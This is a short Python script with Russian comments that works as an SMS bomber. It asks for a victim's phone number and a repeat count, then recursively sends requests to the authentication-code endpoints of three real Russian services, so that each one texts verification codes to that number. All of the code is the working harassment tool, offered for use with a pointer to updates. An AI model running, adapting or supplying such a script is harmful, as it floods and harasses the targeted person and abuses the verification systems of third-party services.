# Импортируем библиотеку 'Requests'
import requests

# Немного рекламы
url = 'https://github.com/'
print(f'Обновления всегда будут доступны по ссылке - {url}')

# Получаем данные от пользователя
phone = input('Номер телефона (без знака +): ')
amount = input('Количество повторений: ')

# Получили данные от пользователя, заполняем и запускаем функцию
def spam(x):
	if x < int(amount):
		spam(x + 1)
		requests.post('https://eda.yandex.ru/api/v1/user/request_authentication_code', json={'phone_number' : phone})
		requests.post('https://youla.ru/web-api/auth/request_code', json={'phone' : phone})
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn' : phone})
		print(f'Сообщения с 3 сервисов отправленны на номер {phone}')

spam(0)